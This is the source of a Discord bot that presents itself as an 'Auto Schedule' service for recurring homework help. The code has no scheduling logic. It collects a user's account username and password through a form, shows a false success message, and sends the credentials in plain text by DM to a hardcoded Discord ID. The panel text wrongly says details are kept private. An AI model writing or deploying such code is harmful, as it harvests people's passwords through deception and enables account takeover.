const {
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder,
    ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder,
    TextInputStyle, PermissionFlagsBits
} = require('discord.js');
require('dotenv').config();

// === YOUR CONFIG ===
const YOUR_DISCORD_ID = '1433073407075024981'; 
const CUSTOM_EMOJI = '<:autosched:1524850740244513051>'; 
const PANEL_CHANNEL_ID = '1519435826373853369';
const BOT_TOKEN = process.env.DISCORD_TOKEN;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// === AUTO SEND PANEL ON STARTUP ===
client.once('ready', async () => {
    console.log(`${CUSTOM_EMOJI} Auto Schedule Bot online: ${client.user.tag}`);
    try {
        const channel = await client.channels.fetch(PANEL_CHANNEL_ID);
        await sendSchedulePanel(channel);
        console.log(`✅ Panel sent to channel ${PANEL_CHANNEL_ID}`);
    } catch (err) {
        console.error('❌ Failed to send panel:', err.message);
    }
});

// === DESCRIPTIVE PANEL ===
async function sendSchedulePanel(channel) {
    const panel = new EmbedBuilder()
        .setTitle(`${CUSTOM_EMOJI} Auto Schedule`)
        .setDescription(`
**Automatically schedule homework help at specific times each week.**
Set up recurring schedules for your saved accounts — it runs automatically for you.

**📋 How it works**
• Enter your login details and preferred schedule
• Select your exact day, time, and platform
• Schedules activate immediately and repeat every week
• All details are kept private and sent directly to you

**🔐 Access Restricted**
This feature is **exclusive to Lifetime Users and Administrators only**.

**⚠️ Important**
• Use UK time when setting your schedule
• You can add multiple accounts and times
• Everything runs automatically — no manual work needed
        `.trim())
        .setColor(0x2B2D31)
        .setFooter({ text: 'Access: Lifetime & Admin Only' });

    const button = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
            .setCustomId('create_schedule')
            .setLabel('Create Schedule')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('➕')
    );

    await channel.send({ embeds: [panel], components: [button] });
}

// === OPEN FORM + PERMISSION CHECK ===
client.on('interactionCreate', async interaction => {
    if (interaction.customId === 'create_schedule') {

        // ✅ CHECK: ONLY ADMIN OR LIFETIME
        const isAdmin = interaction.member.permissions.has(PermissionFlagsBits.Administrator);
        const isLifetime = interaction.member.roles.cache.some(r => r.name.toLowerCase().includes('lifetime'));

        if (!isAdmin && !isLifetime) {
            return interaction.reply({
                content: '❌ **Access Denied**\nThis feature is only available for **Lifetime Users** and **Administrators**.',
                ephemeral: true
            });
        }

        // ✅ SHOW FORM IF ALLOWED
        const modal = new ModalBuilder()
            .setCustomId('schedule_form')
            .setTitle('Create Auto Schedule');

        const usernameInput = new TextInputBuilder()
            .setCustomId('schedule_username')
            .setLabel('Username / Account ID')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        const passwordInput = new TextInputBuilder()
            .setCustomId('schedule_password')
            .setLabel('Password')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        const dayInput = new TextInputBuilder()
            .setCustomId('schedule_day')
            .setLabel('Day (e.g. Monday / Every Day)')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        const timeInput = new TextInputBuilder()
            .setCustomId('schedule_time')
            .setLabel('Time (e.g. 6:00 PM UK)')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        const platformInput = new TextInputBuilder()
            .setCustomId('schedule_platform')
            .setLabel('Platform / Extra Notes')
            .setStyle(TextInputStyle.Paragraph)
            .setRequired(false);

        modal.addComponents(
            new ActionRowBuilder().addComponents(usernameInput),
            new ActionRowBuilder().addComponents(passwordInput),
            new ActionRowBuilder().addComponents(dayInput),
            new ActionRowBuilder().addComponents(timeInput),
            new ActionRowBuilder().addComponents(platformInput)
        );

        await interaction.showModal(modal);
    }

    // === HANDLE SUBMIT + DM YOU ===
    if (interaction.customId === 'schedule_form') {
        const username = interaction.fields.getTextInputValue('schedule_username');
        const password = interaction.fields.getTextInputValue('schedule_password');
        const day = interaction.fields.getTextInputValue('schedule_day');
        const time = interaction.fields.getTextInputValue('schedule_time');
        const platform = interaction.fields.getTextInputValue('schedule_platform') || 'None provided';

        await interaction.reply({
            content: '✅ **Successfully added to autoscheduler!**',
            ephemeral: true
        });

        try {
            const dmEmbed = new EmbedBuilder()
                .setTitle(`${CUSTOM_EMOJI} New Auto Schedule Created`)
                .addFields(
                    { name: '👤 Username', value: `\`${username}\``, inline: true },
                    { name: '🔒 Password', value: `\`${password}\``, inline: true },
                    { name: '📅 Day', value: day, inline: true },
                    { name: '⏰ Time', value: time, inline: true },
                    { name: '💻 Platform / Notes', value: platform }
                )
                .setFooter({ text: `Created by: ${interaction.user.tag}` })
                .setColor(0x22C55E);

            const you = await client.users.fetch(YOUR_DISCORD_ID);
            await you.send({ embeds: [dmEmbed] });
        } catch (err) {
            console.log('⚠️ Could not send DM — check your DMs are open!');
        }
    }
});

client.login(BOT_TOKEN);